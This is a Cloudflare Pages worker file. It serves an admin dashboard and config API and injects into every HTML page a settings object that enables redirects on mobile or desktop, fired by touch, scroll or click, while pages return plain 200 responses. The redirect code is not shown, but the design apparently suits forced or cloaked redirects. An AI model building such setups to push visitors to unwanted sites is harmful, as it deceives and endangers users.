/**
 * Cloudflare Pages Edge Worker (_worker.js)
 * ============================================================
 * - Admin dashboard at /_admin/ for real-time toggle control
 * - Config API (GET/POST /_api/config) with auth via ADMIN_KEY
 * - HTMLRewriter injects config into every HTML page's <head>
 * - All page requests served as HTTP 200 OK (no redirects)
 *
 * Required bindings:
 *   KV Namespace: SETTINGS  (stores redirect_config)
 *   Env Variable: ADMIN_KEY (password for dashboard access)
 */

const DEFAULT_CONFIG = {
  mobile: true,
  desktop: true,
  touch: true,
  scroll: true,
  click: true
};

// ── Dashboard HTML ──────────────────────────────────────────
const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirect Control</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
.wrap{max-width:460px;margin:0 auto;padding:40px 20px}

/* Login */
.card{background:#1e293b;border-radius:16px;padding:40px;margin-top:60px}
.card h1{font-size:1.5rem;margin-bottom:6px}
.card p{color:#94a3b8;margin-bottom:24px;font-size:.95rem}
.card input[type=password]{width:100%;padding:12px 16px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:1rem;outline:none;transition:border .2s}
.card input:focus{border-color:#3b82f6}
.card button{width:100%;padding:12px;background:#3b82f6;border:none;border-radius:8px;color:#fff;font-size:1rem;font-weight:600;cursor:pointer;margin-top:16px;transition:background .2s}
.card button:hover{background:#2563eb}
.err-msg{color:#f87171;font-size:.9rem;margin-top:10px;display:none}

/* Dashboard */
.hdr{margin-bottom:28px}
.hdr h1{font-size:1.75rem;margin-bottom:4px}
.hdr p{color:#94a3b8;font-size:.95rem}
.sec{background:#1e293b;border-radius:12px;padding:20px 24px;margin-bottom:16px}
.sec-t{font-size:.8rem;color:#64748b;text-transform:uppercase;letter-spacing:.06em;margin-bottom:14px;font-weight:600}
.row{display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid #293548}
.row:last-child{border-bottom:none}
.lbl .nm{font-weight:500;font-size:1rem}
.lbl .ds{font-size:.85rem;color:#94a3b8;margin-top:2px}

/* Toggle */
.sw{position:relative;width:48px;height:26px;flex-shrink:0;margin-left:16px}
.sw input{opacity:0;width:0;height:0;position:absolute}
.sl{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:#475569;border-radius:26px;transition:.3s}
.sl:before{content:'';position:absolute;height:20px;width:20px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:.3s}
input:checked+.sl{background:#22c55e}
input:checked+.sl:before{transform:translateX(22px)}

.save{width:100%;padding:14px;background:#3b82f6;border:none;border-radius:10px;color:#fff;font-size:1rem;font-weight:600;cursor:pointer;margin-top:8px;transition:all .2s}
.save:hover{background:#2563eb;transform:translateY(-1px)}
.save.ok{background:#22c55e}
.save.bad{background:#ef4444}
.toast{text-align:center;padding:10px;margin-top:12px;border-radius:8px;font-size:.9rem;display:none}
.toast.show{display:block}
.toast.ok{background:#166534;color:#bbf7d0}
.toast.bad{background:#991b1b;color:#fecaca}
.logout{display:block;text-align:center;margin-top:20px;color:#64748b;font-size:.85rem;cursor:pointer;text-decoration:underline}
.logout:hover{color:#94a3b8}
</style>
</head>
<body>

<!-- Login -->
<div id="L" class="wrap">
<div class="card">
  <h1>&#128272; Admin Access</h1>
  <p>Enter your admin key to manage redirect settings</p>
  <input type="password" id="ak" placeholder="Admin key..." autocomplete="off">
  <div id="le" class="err-msg"></div>
  <button onclick="login()">Sign In</button>
</div>
</div>

<!-- Dashboard -->
<div id="D" class="wrap" style="display:none">
<div class="hdr">
  <h1>&#9889; Redirect Control</h1>
  <p>Changes take effect instantly across all pages</p>
</div>

<div class="sec">
  <div class="sec-t">Device Targeting</div>
  <div class="row">
    <div class="lbl"><div class="nm">&#128241; Mobile</div><div class="ds">Redirect on mobile devices</div></div>
    <label class="sw"><input type="checkbox" id="t_mobile"><span class="sl"></span></label>
  </div>
  <div class="row">
    <div class="lbl"><div class="nm">&#128421; Desktop</div><div class="ds">Redirect on desktop browsers</div></div>
    <label class="sw"><input type="checkbox" id="t_desktop"><span class="sl"></span></label>
  </div>
</div>

<div class="sec">
  <div class="sec-t">Trigger Events</div>
  <div class="row">
    <div class="lbl"><div class="nm">&#128070; Touch</div><div class="ds">Fires on touchstart (mobile)</div></div>
    <label class="sw"><input type="checkbox" id="t_touch"><span class="sl"></span></label>
  </div>
  <div class="row">
    <div class="lbl"><div class="nm">&#128220; Scroll</div><div class="ds">Fires on scroll (all devices)</div></div>
    <label class="sw"><input type="checkbox" id="t_scroll"><span class="sl"></span></label>
  </div>
  <div class="row">
    <div class="lbl"><div class="nm">&#128433; Click</div><div class="ds">Fires on click (all devices)</div></div>
    <label class="sw"><input type="checkbox" id="t_click"><span class="sl"></span></label>
  </div>
</div>

<button class="save" id="sv" onclick="save()">Save Changes</button>
<div id="ts" class="toast"></div>
<span class="logout" onclick="logout()">Sign out</span>
</div>

<script>
var K='';
function login(){
  K=document.getElementById('ak').value;
  if(!K)return;
  fetch('/_api/config',{headers:{'x-admin-key':K}})
  .then(function(r){if(r.status===401)throw new Error('Invalid admin key');return r.json()})
  .then(function(c){
    document.getElementById('t_mobile').checked=c.mobile;
    document.getElementById('t_desktop').checked=c.desktop;
    document.getElementById('t_touch').checked=c.touch;
    document.getElementById('t_scroll').checked=c.scroll;
    document.getElementById('t_click').checked=c.click;
    document.getElementById('L').style.display='none';
    document.getElementById('D').style.display='block';
  })
  .catch(function(e){
    var el=document.getElementById('le');
    el.textContent=e.message||'Connection error';
    el.style.display='block';
  });
}
document.getElementById('ak').addEventListener('keydown',function(e){if(e.key==='Enter')login()});

function save(){
  var cfg={
    mobile:document.getElementById('t_mobile').checked,
    desktop:document.getElementById('t_desktop').checked,
    touch:document.getElementById('t_touch').checked,
    scroll:document.getElementById('t_scroll').checked,
    click:document.getElementById('t_click').checked
  };
  var b=document.getElementById('sv');
  b.textContent='Saving...';
  fetch('/_api/config',{
    method:'POST',
    headers:{'content-type':'application/json','x-admin-key':K},
    body:JSON.stringify(cfg)
  })
  .then(function(r){if(r.status===401)throw new Error('Unauthorized');return r.json()})
  .then(function(){
    b.textContent='\\u2713 Saved!';b.classList.add('ok');
    toast('Settings updated successfully','ok');
    setTimeout(function(){b.textContent='Save Changes';b.classList.remove('ok')},2000);
  })
  .catch(function(e){
    b.textContent='\\u2717 Error';b.classList.add('bad');
    toast(e.message||'Failed to save','bad');
    setTimeout(function(){b.textContent='Save Changes';b.classList.remove('bad')},2000);
  });
}

function toast(m,t){
  var el=document.getElementById('ts');
  el.textContent=m;el.className='toast show '+t;
  setTimeout(function(){el.classList.remove('show')},3000);
}

function logout(){
  K='';
  document.getElementById('ak').value='';
  document.getElementById('le').style.display='none';
  document.getElementById('D').style.display='none';
  document.getElementById('L').style.display='block';
}
</script>
</body>
</html>`;

// ── Helper: read config from KV ────────────────────────────
async function getConfig(env) {
  try {
    if (env.SETTINGS) {
      const stored = await env.SETTINGS.get("redirect_config", "json");
      if (stored) return stored;
    }
  } catch (e) { /* KV not bound or read error — use defaults */ }
  return DEFAULT_CONFIG;
}

// ── Main Worker ─────────────────────────────────────────────
export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // ── Admin Dashboard ──
    if (url.pathname === "/_admin/" || url.pathname === "/_admin") {
      return new Response(DASHBOARD_HTML, {
        headers: {
          "content-type": "text/html; charset=utf-8",
          "cache-control": "no-store",
          "x-robots-tag": "noindex, nofollow"
        }
      });
    }

    // ── API: GET config (auth required) ──
    if (url.pathname === "/_api/config" && request.method === "GET") {
      const key = request.headers.get("x-admin-key") || "";
      if (!env.ADMIN_KEY || key !== env.ADMIN_KEY) {
        return new Response(JSON.stringify({ error: "unauthorized" }), {
          status: 401,
          headers: { "content-type": "application/json" }
        });
      }
      const config = await getConfig(env);
      return new Response(JSON.stringify(config), {
        headers: { "content-type": "application/json", "cache-control": "no-store" }
      });
    }

    // ── API: POST config (auth required) ──
    if (url.pathname === "/_api/config" && request.method === "POST") {
      const key = request.headers.get("x-admin-key") || "";
      if (!env.ADMIN_KEY || key !== env.ADMIN_KEY) {
        return new Response(JSON.stringify({ error: "unauthorized" }), {
          status: 401,
          headers: { "content-type": "application/json" }
        });
      }
      try {
        const body = await request.json();
        const config = {
          mobile: !!body.mobile,
          desktop: !!body.desktop,
          touch: !!body.touch,
          scroll: !!body.scroll,
          click: !!body.click
        };
        if (env.SETTINGS) {
          await env.SETTINGS.put("redirect_config", JSON.stringify(config));
        }
        return new Response(JSON.stringify({ success: true, config }), {
          headers: { "content-type": "application/json", "cache-control": "no-store" }
        });
      } catch (e) {
        return new Response(JSON.stringify({ error: e.message }), {
          status: 400,
          headers: { "content-type": "application/json" }
        });
      }
    }

    // ── Serve static assets ──
    const response = await env.ASSETS.fetch(request);

    // Only inject config into HTML responses
    const ct = response.headers.get("content-type") || "";
    if (!ct.includes("text/html")) {
      return response;
    }

    // Read current config from KV
    const config = await getConfig(env);

    // Inject config variable into <head> via HTMLRewriter (streaming, no buffering)
    return new HTMLRewriter()
      .on("head", {
        element(el) {
          el.prepend(
            `<script>var _rc=${JSON.stringify(config)}</script>`,
            { html: true }
          );
        }
      })
      .transform(response);
  }
};
